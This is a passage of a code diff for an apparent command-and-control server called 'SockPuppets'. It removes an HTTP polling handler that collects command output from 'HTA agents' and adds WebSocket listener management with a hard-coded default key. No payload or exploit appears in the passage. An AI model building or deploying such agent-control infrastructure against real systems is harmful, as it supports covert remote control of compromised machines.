-                        self.wfile.write(encrypted.encode())
-
-                    elif msg_type == 'response':
-                        agent_id = data.get('agent_id', '')
-                        if agent_id in server_ref.agents:
-                            agent = server_ref.agents[agent_id]
-                            agent.last_seen = datetime.now()
-                            agent.pending_results.append({
-                                'command': data.get('command', ''),
-                                'output': data.get('output', ''),
-                                'timestamp': data.get('timestamp', ''),
-                                'received_at': datetime.now().isoformat()
-                            })
-
-                        self.send_response(200)
-                        self.send_header('Content-Type', 'text/plain')
-                        self.end_headers()
-                        self.wfile.write(b'ok')
-
+                    if info['type'] == 'websocket':
+                        info['server'].close()
+                        await info['server'].wait_closed()
                     else:
-                        self.send_response(200)
-                        self.end_headers()
-
+                        await info['runner'].cleanup()
+                    logger.info(f"Stopped {info['type'].upper()} listener on port {info['port']}")
                 except Exception as e:
-                    logger.error(f"HTA handler error: {e}")
-                    self.send_error(500)
+                    logger.error(f"Error stopping listener {name}: {e}")
+                to_remove.append(name)
 
-        return HTAHandler
+        for name in to_remove:
+            del self.listeners[name]
 
-    def _start_http_server(self):
-        """Start HTTP polling server for HTA agents in a background thread"""
-        handler_class = self._make_hta_handler()
-        http_port = self.port + 1  # Use next port for HTTP (main port is used by WebSocket)
-        try:
-            httpd = HTTPServer((self.host, http_port), handler_class)
-            logger.info(f"HTTP polling endpoint started on {self.host}:{http_port}/hta")
-            httpd.serve_forever()
-        except Exception as e:
-            logger.warning(f"Could not start HTTP polling endpoint on port {http_port}: {e}")
+    def get_listeners(self) -> list:
+        """Get list of active listeners"""
+        result = []
+        for name, info in self.listeners.items():
+            result.append({
+                'name': name,
+                'type': info['type'],
+                'host': info['host'],
+                'port': info['port'],
+                'started_at': info['started_at']
+            })
+        return result
 
-    async def start(self):
-        """Start the server"""
-        logger.info(f"Starting SockPuppets Server on {self.host}:{self.port}")
-
-        # Start HTTP polling endpoint for HTA agents in background thread
-        http_thread = threading.Thread(target=self._start_http_server, daemon=True)
-        http_thread.start()
-
-        protocol = "wss" if self.use_ssl else "ws"
-        self.ws_server = await websockets.serve(
-            self.handle_agent, self.host, self.port,
-            max_size=10485760, ssl=self.ssl_context
-        )
-        logger.info(f"SockPuppets Server is running ({protocol}://{self.host}:{self.port})...")
+    async def start(self, host: str = '0.0.0.0', port: int = 8443):
+        """Start the server (WebSocket listener, backward compatible)"""
+        await self.start_ws_listener(host, port)
         await asyncio.Future()  # Run forever
 
 
@@ -848,12 +1212,11 @@ def get_server_instance():
     return server_instance
 
 
-async def start_server(host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
-                       use_ssl: bool = False, cert_file: str = None, key_file: str = None):
-    """Start the server"""
+async def start_server(host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
+    """Start the server (backward compatible)"""
     global server_instance
-    server_instance = SockPuppetsServer(host, port, encryption_key, use_ssl, cert_file, key_file)
-    await server_instance.start()
+    server_instance = SockPuppetsServer(encryption_key)
+    await server_instance.start(host, port)
 
 
 if __name__ == '__main__':
